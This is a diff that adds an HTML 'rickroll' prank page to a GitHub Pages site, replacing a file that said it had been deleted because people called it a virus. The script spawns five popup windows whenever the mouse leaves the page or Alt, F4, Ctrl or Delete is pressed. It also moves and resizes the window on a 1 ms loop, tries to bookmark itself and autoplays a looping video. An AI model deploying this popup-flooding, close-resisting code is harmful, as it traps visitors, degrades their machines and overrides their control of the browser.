@@ -1,1 +1,111 @@
-Deleted because everyone says it's a virus when it's not!
+<html>
+	<head>
+		<title>!RICKROLLED!</title>
+
+		<meta name="Author" content="ChrisEric1 CECL (CE1CECL)">
+		<meta name="Keywords" content="!RICKROLLED! Never gonna give you up!">
+		<meta name="Description" content="You are Screwed Forever and EVER!">
+		
+		<meta property=og:type content=website>
+		<meta property=og:title content="!RICKROLLED!">
+		<meta property=og:description content="You are Screwed Forever and EVER!">
+		<meta property=og:url content=https://CE1CECL.github.io/><meta property=og:image content=https://CE1CECL.github.io/invert.png>
+		<meta property=og:image:secure_url content=https://CE1CECL.github.io/invert.png>
+		<meta property=og:image:width content=256>
+		<meta property=og:image:height content=256>
+		<meta property=og:image:alt content=!RICKROLLED!>
+		
+		
+		<script>
+function bookmark() {
+		if ((navigator.appName == "Microsoft Internet Explorer") 
+		&& (parseInt(navigator.appVersion) >= 4)) 
+		{
+		var url="https://ce1cecl.github.io/RA_NGGUU/";
+		var title="!RICKROLLED!";
+		window.external.AddFavorite(url,title);
+		}
+		}
+
+		var xOff = 5;
+		var yOff = 5;
+		var xPos = 400;
+		var yPos = -100;
+		var flagRun = 1;
+
+function changeTitle(title) {
+	document.title = title;
+}
+
+function openWindow(url) {
+	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
+}
+
+function procreate() {
+	changeTitle("!RICKROLLED!");
+	for (var i = 0; i < 5; i++) {
+		openWindow('https://ce1cecl.github.io/RA_NGGUU/');
+	}
+}
+
+function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("!RICKROLLED! Never gonna give you up!"); procreate(); } }
+function ctrlkey() { if (event.keyCode == 17) { alert("!RICKROLLED! Never gonna give you up!"); procreate(); } }
+function delkey() { if (event.keyCode == 46) { alert("!RICKROLLED! Never gonna give you up!"); procreate(); } }
+
+function newXlt(){
+	xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
+	window.focus()
+}
+
+function newXrt(){
+	xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
+}
+
+function newYup(){
+	yOff = Math.ceil(-6 * Math.random())  * 5 - 10 ;
+}
+
+function newYdn(){
+	yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
+}
+
+function fOff(){
+	flagrun = 0;
+}
+
+function playBall() {
+    xPos += xOff;
+    yPos += yOff;
+    
+	if (xPos > screen.width - 357) {
+		newXlt();
+    }
+    
+	if (xPos < 0){
+		newXrt();
+    }
+    
+	if (yPos > screen.height - 330) {
+        newYup();
+    }   
+		
+	if (yPos < 0){
+        newYdn();
+    }
+    
+	if (flagRun == 1){
+	window.resizeTo(357, 330);
+        window.moveTo(xPos, yPos);
+        setTimeout('playBall()', 1);
+    }
+}
+
+		</script>
+	</head>
+
+	<body bgcolor="#ffffff" onload="flagRun=1;playBall();return true;bookmark();" onkeydown="altf4key();ctrlkey();delkey();" onmouseout="procreate();" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
+		<video width="357" height="330" autoplay loop>
+			<source src="https://ce1cecl.github.io/RA_NGGUU.mp4" type="video/mp4">
+		</video>
+	</body>
+</html>
